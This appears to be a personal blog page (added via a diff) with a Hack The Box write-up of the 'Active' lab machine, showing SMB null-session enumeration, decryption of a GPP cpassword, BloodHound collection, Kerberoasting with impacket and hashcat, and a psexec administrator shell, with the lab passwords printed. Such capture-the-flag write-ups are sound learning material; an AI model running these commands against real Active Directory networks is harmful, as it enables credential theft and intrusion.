@@ -1,0 +1,221 @@
+<!DOCTYPE HTML>
+<html>
+	<head>
+		<title>Writeups | bokkisec</title>
+		<meta charset="utf-8" />
+		<meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no" />
+		<link rel="stylesheet" href="assets/css/main.css" />
+	</head>
+	<body class="is-preload">
+
+		<!-- Header -->
+			<div id="header">
+
+				<div class="top">
+
+					<!-- Logo -->
+						<div id="logo">
+							<!-- <span class="image avatar48"><img src="images/avatar.jpg" alt="" /></span> -->
+							<a href="https://bokkisec.com"><span class="icon solid fa-home"></span>bokkisec</a>
+							<p style="padding-bottom: 10px;"></p>
+							<a href=""><h1 id="title">Active</h1></a>
+						</div>
+
+					<!-- Nav -->
+						<nav id="nav">
+							<ul>
+								<li><a href="#enu" id="sec1-link"><span>Enumeration</span></a></li>
+								<li><a href="#foothold" id="sec2-link"><span>Foothold</span></a></li>
+								<li><a href="#privesc" id="sec3-link"><span>Privilege Escalation</span></a></li>
+							</ul>
+						</nav>
+
+				</div>
+
+				<div class="bottom">
+
+					<!-- Social Icons -->
+						<ul class="icons">
+							<li><a href="mailto:joshchung02@gmail.com" class="icon fa-envelope"><span class="label">Email</span></a></li>
+							<li><a href="https://www.linkedin.com/in/joshchung02/" class="icon brands fa-linkedin"><span class="label">LinkedIn</span></a></li>
+							<li><a href="https://github.com/bokkisec" class="icon brands fa-github"><span class="label">GitHub</span></a></li>
+						</ul>
+
+				</div>
+
+			</div>
+
+		<!-- Main -->
+			<div id="main">
+
+				<!-- Intro -->
+				<section id="top" class="one dark" style="background-image: url('images/easy.jpg')">
+					<div class="container">
+						<header>
+							<h2 style="text-align: center;">Flight</h2>
+							<div style="text-align: center;">Published: Feb 25, 2025</div>
+							<div style="text-align: center;"><img src="images/active/active.png"></div>
+						</header>
+					</div>
+				</section>
+
+				<!-- Content -->
+					<section id="enu" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Enumeration</h2>
+								</header>
+
+								<h3>Scan</h3>
+								<p>
+									The following is a one-liner I came up with to scan HTB machines, which uses <code>rustscan</code> to quickly identify all open TCP ports and then does a detailed scan using <code>nmap</code>
+									<pre>TARGET=10.10.10.100; rustscan -r 1-65535 --scripts none -a $TARGET | tee scans/fast.rustscan | grep '\->' | awk -F'[' '{print $2}' | sed 's/]//' | read PORTS; nmap -sC -sV -oN scans/detailed.nmap -p $PORTS $TARGET</pre>
+									<img src="images/active/enu1.png">
+								</p>
+
+								<h3>SMB</h3>
+								<p>
+									Let’s see if we can enumerate SMB without any valid credentials (null authentication)
+									<pre>nxc smb 10.10.10.100 -u '' -p '' --shares</pre>
+									<img src="images/active/enu2.png">
+								</p>
+								<p>
+									We can read a share called “Replication”. Let’s use the <code>spider_plus</code> module to look for potentially interesting files
+									<pre>nxc smb 10.10.10.100 -u '' -p '' -m spider_plus</pre>
+									<img src="images/active/enu3.png">
+								</p>
+								<p>
+									The output is in json format and is saved in <code>/tmp/nxc_hosted/nxc_spider_plus</code> as <code>10.10.10.100.json</code>
+								</p>
+								<p>
+									Let’s use <code>jq</code> for some nice output
+									<pre>cat /tmp/nxc_hosted/nxc_spider_plus/10.10.10.100.json | jq .</pre>
+									<img src="images/active/enu4.png">
+								</p>
+								<p>
+									One file that stands out to me is the <code>Groups.xml</code> file
+								</p>
+								<p>
+									Let’s download it to our local machine using <code>smbclient</code> while specifying null credentials
+									<pre>smbclient -U '%' //10.10.10.100/Replication</pre>
+									<img src="images/active/enu5.png">
+								</p>
+							</div>
+						</div>
+					</section>
+
+					<section id="foothold" class="two">
+						<div class="container">
+							<div class="content">
+								<header>
+									<h2>Foothold</h2>
+								</header>
+
+								<h3>Group Policy Preferences (GPP)</h3>
+								<p>
+									Taking a look at the file we downloaded:
+									<img src="images/active/foo1.png"><br>
+									This is a file related to Group Policy Preferences (GPP), which, according to the MSDN, is 
+									"a collection of Group Policy client-side extensions that deliver preference settings to domain-joined computers running Microsoft Windows desktop and server operating systems."
+									The XML config file contains a password encrypted with a key that has been published by Microsoft.
+								</p>
+								<p>
+									
+								</p>
+								<p>
+									The <code>cpassword</code> can be decrypted using a tool called <code>gpp-decrypt</code>
+									<pre>gpp-decrypt edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh+ZGMeXOsQbCpZ3xUjTLfCuNH8pG5aSVYdYw/NglVmQ</pre>
+									<img src="images/active/foo2.png"><br>
+									The password for the <code>svc_tgs</code> account is <code>GPPStillStandingStrong2k18</code>
+								</p>
+
+								<h3>SMB (Again)</h3>
+								<p>
+									Now that we have new credentials, let's enumerate SMB again
+									<pre>nxc smb 10.10.10.100 -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' --shares</pre>
+									<img src="images/active/foo3.png">
+								</p>
+								<p>
+									We can now read a lot more shares, which includes the "Users" share<br>
+									You can do some looking around, but there isn’t much other than the <code>user.txt</code> flag
+									<img src="images/active/foo4.png">
+								</p>
+							</div>
+						</div>
+					</section>
+
+					<section id="privesc" class="two">
+						<div class="container">
+							<div class="content">
+
+								<header>
+									<h2>Privilege Escalation</h2>
+								</header>
+
+								<h3>Bloodhound</h3>
+								<p>
+									From our enumeration, we know that we are attacking the Domain Controller for the domain <code>active.htb</code><br>
+									One tool I always run in Active Directory environments is Bloodhound, because it allows you to visualize the attack surface.
+									The tool is not required to solve this machine, but it is what I used to find the next step.
+									To set up Bloodhound on kali, reference this <a href="https://www.kali.org/tools/bloodhound/">documentation</a>.
+								</p>
+								<p>
+									I will use <code>bloodhound.py</code> as my ingestor (<a href="https://github.com/dirkjanm/BloodHound.py">Github</a>)
+									<pre>python3 bloodhound.py -u 'svc_tgs' -p 'GPPstillStandingStrong2k18' -d active.htb -ns 10.10.10.100 -c all</pre><br>
+									After loading the data into Bloodhound and going through some of the "Analysis" queries, I was able to spot something unusual: 
+									the Administrator account is Kerberoastable.
+									<img src="images/active/pe1.png">
+								</p>
+
+								<h3>Kerberoast</h3>
+								<p>
+									A user object can contain a Service Principal Name (SPN) to act as a service account.
+									When a user requests a Ticket Granting Service (TGS) ticket from an SPN, it is encrypted using a hash derived from the corresponding account's password.
+									The Kerberoast attack involves requesting the TGS and cracking the password offline.
+								</p>
+								<p>
+									To get a crackable hash, use <code>GetUserSPNs</code> from <code>impacket</code>
+									<pre>impacket-GetUserSPNs active.htb/svc_tgs:'GPPStillStandingStrong2k18' -dc-ip 10.10.10.100 -request</pre>
+									<img src="images/active/pe2.png">
+								</p>
+								<p>
+									Let's try cracking it with <code>hashcat</code> and the <code>rockyou.txt</code> wordlist
+									<pre>hashcat -m 13100 administrator.hash /usr/share/wordlists/rockyou.txt</pre>
+									<img src="images/active/pe3.png"><br>
+									We now have the Administrator's password: <code>Ticketmaster1968</code>
+								</p>
+
+								<h3>Shell Access</h3>
+								<p>
+									With these administrative credentials, there are a number of ways to get shell access on the box<br>
+									I will use <code>psexec</code> from <code>impacket</code> and retrieve the <code>root.txt</code> flag from the Administrator's desktop
+									<pre>impacket-psexec administrator:'Ticketmaster1968'@10.10.10.100</pre>
+									<img src="images/active/pe4.png">
+								</p>
+							</div>
+						</div>
+					</section>
+			</div>
+
+		<!-- Footer -->
+			<div id="footer">
+
+				<!-- Copyright -->
+					<ul class="copyright">
+						<li>&copy; 2025 Joshua Chung</li><li>Design: <a href="http://html5up.net">HTML5 UP</a></li>
+					</ul>
+
+			</div>
+
+		<!-- Scripts -->
+			<script src="assets/js/jquery.min.js"></script>
+			<script src="assets/js/jquery.scrolly.min.js"></script>
+			<script src="assets/js/jquery.scrollex.min.js"></script>
+			<script src="assets/js/browser.min.js"></script>
+			<script src="assets/js/breakpoints.min.js"></script>
+			<script src="assets/js/util.js"></script>
+			<script src="assets/js/main.js"></script>
+
+	</body>
+</html>
